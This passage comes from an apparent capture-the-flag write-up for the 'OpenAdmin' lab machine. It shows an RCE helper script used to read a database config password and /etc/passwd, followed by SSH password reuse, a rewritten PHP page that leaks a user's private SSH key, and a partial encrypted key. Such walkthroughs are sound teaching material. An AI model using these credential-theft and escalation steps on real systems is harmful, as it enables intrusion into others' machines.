&lt;span class="code-line"&gt;-rw-rw-r--  1 www-data www-data 1106 Jan  3  2018 logout.php&lt;/span&gt;
&lt;span class="code-line"&gt;drwxrwxr-x  3 www-data www-data 4096 Jan  3  2018 modules&lt;/span&gt;
&lt;span class="code-line"&gt;drwxrwxr-x  3 www-data www-data 4096 Jan  3  2018 plugins&lt;/span&gt;
&lt;span class="code-line"&gt;drwxrwxr-x  2 www-data www-data 4096 Jan  3  2018 winc&lt;/span&gt;
&lt;span class="code-line"&gt;drwxrwxr-x  3 www-data www-data 4096 Jan  3  2018 workspace_plugins&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We notice that the file are from January 2018. So we just filter on file older
that 30 days. That allow us to find a configuration file for the database
containing a password.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;sh ona_rce.sh &amp;#39;find ../../ -mtime -30 2&amp;gt;/dev/null | grep -Ev &amp;quot;^/proc&amp;quot;&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;                &amp;lt;pre style=&amp;quot;padding: 4px;font-family: monospace;&amp;quot;&amp;gt;BEGIN&lt;/span&gt;
&lt;span class="code-line"&gt;../../&lt;/span&gt;
&lt;span class="code-line"&gt;../../priv.save&lt;/span&gt;
&lt;span class="code-line"&gt;../../ona/www&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;sh ona_rce.sh &amp;#39;cat ../../ona/www/local/config/database_settings.inc.php&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;                &amp;lt;pre style=&amp;quot;padding: 4px;font-family: monospace;&amp;quot;&amp;gt;BEGIN&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;$ona_contexts=array (&lt;/span&gt;
&lt;span class="code-line"&gt;  &amp;#39;DEFAULT&amp;#39; =&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  array (&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;#39;databases&amp;#39; =&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    array (&lt;/span&gt;
&lt;span class="code-line"&gt;      0 =&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;      array (&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;#39;db_type&amp;#39; =&amp;gt; &amp;#39;mysqli&amp;#39;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;#39;db_host&amp;#39; =&amp;gt; &amp;#39;localhost&amp;#39;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;#39;db_login&amp;#39; =&amp;gt; &amp;#39;ona_sys&amp;#39;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;#39;db_passwd&amp;#39; =&amp;gt; &amp;#39;n1nj4W4rri0R!&amp;#39;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;#39;db_database&amp;#39; =&amp;gt; &amp;#39;ona_default&amp;#39;,&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;#39;db_debug&amp;#39; =&amp;gt; false,&lt;/span&gt;
&lt;span class="code-line"&gt;      ),&lt;/span&gt;
&lt;span class="code-line"&gt;    ),&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;#39;description&amp;#39; =&amp;gt; &amp;#39;Default data context&amp;#39;,&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;#39;context_color&amp;#39; =&amp;gt; &amp;#39;#D3DBFF&amp;#39;,&lt;/span&gt;
&lt;span class="code-line"&gt;  ),&lt;/span&gt;
&lt;span class="code-line"&gt;);&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;?&amp;gt;END&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We want to try this password against SSH users but we don't know them. We can
just cat &lt;code&gt;/etc/passwd&lt;/code&gt; to get a list of the system's user.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;sh ona_rce.sh &amp;#39;cat /etc/passwd&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;                &amp;lt;pre style=&amp;quot;padding: 4px;font-family: monospace;&amp;quot;&amp;gt;BEGIN&lt;/span&gt;
&lt;span class="code-line"&gt;root:x:0:0:root:/root:/bin/bash&lt;/span&gt;
&lt;span class="code-line"&gt;daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;bin:x:2:2:bin:/bin:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;sys:x:3:3:sys:/dev:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;sync:x:4:65534:sync:/bin:/bin/sync&lt;/span&gt;
&lt;span class="code-line"&gt;games:x:5:60:games:/usr/games:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;man:x:6:12:man:/var/cache/man:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;mail:x:8:8:mail:/var/mail:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;news:x:9:9:news:/var/spool/news:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;proxy:x:13:13:proxy:/bin:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;backup:x:34:34:backup:/var/backups:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;syslog:x:102:106::/home/syslog:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;messagebus:x:103:107::/nonexistent:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;_apt:x:104:65534::/nonexistent:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;lxd:x:105:65534::/var/lib/lxd/:/bin/false&lt;/span&gt;
&lt;span class="code-line"&gt;uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;pollinate:x:109:1::/var/cache/pollinate:/bin/false&lt;/span&gt;
&lt;span class="code-line"&gt;sshd:x:110:65534::/run/sshd:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash&lt;/span&gt;
&lt;span class="code-line"&gt;mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false&lt;/span&gt;
&lt;span class="code-line"&gt;joanna:x:1001:1001:,,,:/home/joanna:/bin/bash&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;I tried to logged as &lt;code&gt;joanna&lt;/code&gt; first but the password was &lt;code&gt;jimmy&lt;/code&gt;'s.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;ssh jimmy@10.10.10.171&lt;/span&gt;
&lt;span class="code-line"&gt;jimmy@openadmin:~$ id&lt;/span&gt;
&lt;span class="code-line"&gt;uid=1000(jimmy) gid=1000(jimmy) groups=1000(jimmy),1002(internal)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="internal"&gt;Internal&lt;/h2&gt;
&lt;p&gt;We notice that we are part of the &lt;code&gt;internal&lt;/code&gt; group. Therefore we look for files
belonging to this specific group and found some "internal" directory containing
three PHP script.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;jimmy@openadmin:~$ find / -group internal 2&amp;gt; /dev/null&lt;/span&gt;
&lt;span class="code-line"&gt;/var/www/internal&lt;/span&gt;
&lt;span class="code-line"&gt;/var/www/internal/main.php&lt;/span&gt;
&lt;span class="code-line"&gt;/var/www/internal/logout.php&lt;/span&gt;
&lt;span class="code-line"&gt;/var/www/internal/index.php&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;main.php:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt; &lt;span class="nb"&gt;session_start&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="nb"&gt;isset&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_SESSION&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;username&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nb"&gt;header&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Location: /index.php&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="p"&gt;};&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c1"&gt;# Open Admin Trusted&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c1"&gt;# OpenAdmin&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nv"&gt;$output&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;shell_exec&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;cat /home/joanna/.ssh/id_rsa&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;lt;pre&amp;gt;&lt;/span&gt;&lt;span class="si"&gt;$output&lt;/span&gt;&lt;span class="s2"&gt;&amp;lt;/pre&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="x"&gt;&amp;lt;html&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="x"&gt;&amp;lt;h3&amp;gt;Don&amp;#39;t forget your &amp;quot;ninja&amp;quot; password&amp;lt;/h3&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="x"&gt;Click here to logout &amp;lt;a href=&amp;quot;logout.php&amp;quot; tite = &amp;quot;Logout&amp;quot;&amp;gt;Session&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="x"&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;index.php&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &lt;span class="nb"&gt;ob_start&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &lt;span class="nb"&gt;session_start&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="cp"&gt;&amp;lt;?&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &lt;span class="c1"&gt;// error_reporting(E_ALL);&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &lt;span class="c1"&gt;// ini_set(&amp;quot;display_errors&amp;quot;, 1);&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="x"&gt;&amp;lt;html lang = &amp;quot;en&amp;quot;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="x"&gt;  &amp;lt;head&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="x"&gt;      &amp;lt;title&amp;gt;Tutorialspoint.com&amp;lt;/title&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="x"&gt;      &amp;lt;link href = &amp;quot;css/bootstrap.min.css&amp;quot; rel = &amp;quot;stylesheet&amp;quot;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="x"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="x"&gt;  &amp;lt;/head&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="x"&gt;  &amp;lt;body&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="x"&gt;      &amp;lt;h2&amp;gt;Enter Username and Password&amp;lt;/h2&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="x"&gt;      &amp;lt;div class = &amp;quot;container form-signin&amp;quot;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="x"&gt;        &amp;lt;h2 class=&amp;quot;featurette-heading&amp;quot;&amp;gt;Login Restricted.&amp;lt;span class=&amp;quot;text-muted&amp;quot;&amp;gt;&amp;lt;/span&amp;gt;&amp;lt;/h2&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="x"&gt;          &lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="nv"&gt;$msg&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;isset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;login&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="k"&gt;empty&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;username&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="k"&gt;empty&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;password&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;              &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;username&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;jimmy&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="nb"&gt;hash&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;sha512&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;password&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                  &lt;span class="nv"&gt;$_SESSION&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;username&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;jimmy&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                  &lt;span class="nb"&gt;header&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Location: /main.php&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;              &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                  &lt;span class="nv"&gt;$msg&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Wrong username or password.&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;              &lt;span class="p"&gt;}&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="p"&gt;}&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="x"&gt;      &amp;lt;/div&amp;gt; &amp;lt;!-- /container --&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="x"&gt;      &amp;lt;div class = &amp;quot;container&amp;quot;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="x"&gt;        &amp;lt;form class = &amp;quot;form-signin&amp;quot; role = &amp;quot;form&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="x"&gt;            action = &amp;quot;&lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt; &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nb"&gt;htmlspecialchars&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_SERVER&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;PHP_SELF&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;&amp;quot; method = &amp;quot;post&amp;quot;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="x"&gt;            &amp;lt;h4 class = &amp;quot;form-signin-heading&amp;quot;&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt; &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nv"&gt;$msg&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;&amp;lt;/h4&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="x"&gt;            &amp;lt;input type = &amp;quot;text&amp;quot; class = &amp;quot;form-control&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="x"&gt;              name = &amp;quot;username&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="x"&gt;              required autofocus&amp;gt;&amp;lt;/br&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="x"&gt;            &amp;lt;input type = &amp;quot;password&amp;quot; class = &amp;quot;form-control&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="x"&gt;              name = &amp;quot;password&amp;quot; required&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="x"&gt;            &amp;lt;button class = &amp;quot;btn btn-lg btn-primary btn-block&amp;quot; type = &amp;quot;submit&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="x"&gt;              name = &amp;quot;login&amp;quot;&amp;gt;Login&amp;lt;/button&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="x"&gt;        &amp;lt;/form&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="x"&gt;      &amp;lt;/div&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="x"&gt;  &amp;lt;/body&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="x"&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We can see that the &lt;code&gt;main.php&lt;/code&gt; script just print &lt;code&gt;joanna&lt;/code&gt;'s private SSH key. And
the script is only checking if the &lt;code&gt;username&lt;/code&gt; parameter is set. But we are
unable to access the site. We check the Apache configuration to see that the
port is &lt;code&gt;52846&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;cat /etc/apache2/sites-enabled/internal.conf&lt;/span&gt;
&lt;span class="code-line"&gt;Listen 127.0.0.1:52846&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;VirtualHost 127.0.0.1:52846&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    ServerName internal.openadmin.htb&lt;/span&gt;
&lt;span class="code-line"&gt;    DocumentRoot /var/www/internal&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;IfModule mpm_itk_module&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;AssignUserID joanna joanna&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;/IfModule&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    ErrorLog ${APACHE_LOG_DIR}/error.log&lt;/span&gt;
&lt;span class="code-line"&gt;    CustomLog ${APACHE_LOG_DIR}/access.log combined&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;/VirtualHost&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We rewrote &lt;code&gt;main.php&lt;/code&gt; in order to suppress the parameter check:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;jimmy@openadmin:/var/www/internal$ cat main.php&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class="code-line"&gt;$output = shell_exec(&amp;#39;cat /home/joanna/.ssh/id_rsa&amp;#39;);&lt;/span&gt;
&lt;span class="code-line"&gt;echo &amp;quot;&amp;lt;pre&amp;gt;$output&amp;lt;/pre&amp;gt;&amp;quot;;&lt;/span&gt;
&lt;span class="code-line"&gt;?&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;And we call the page and get &lt;code&gt;joanna's&lt;/code&gt; private SSH key.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;jimmy@openadmin:/var/www/internal$ curl 127.0.0.1:52846/main.php&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;pre&amp;gt;-----BEGIN RSA PRIVATE KEY-----&lt;/span&gt;
&lt;span class="code-line"&gt;Proc-Type: 4,ENCRYPTED&lt;/span&gt;
&lt;span class="code-line"&gt;DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8&lt;/span&gt;
&lt;span class="code-line"&gt;ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO&lt;/span&gt;
&lt;span class="code-line"&gt;ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE&lt;/span&gt;
&lt;span class="code-line"&gt;6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ&lt;/span&gt;
&lt;span class="code-line"&gt;ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du&lt;/span&gt;
&lt;span class="code-line"&gt;y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI&lt;/span&gt;
&lt;span class="code-line"&gt;9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4&lt;/span&gt;
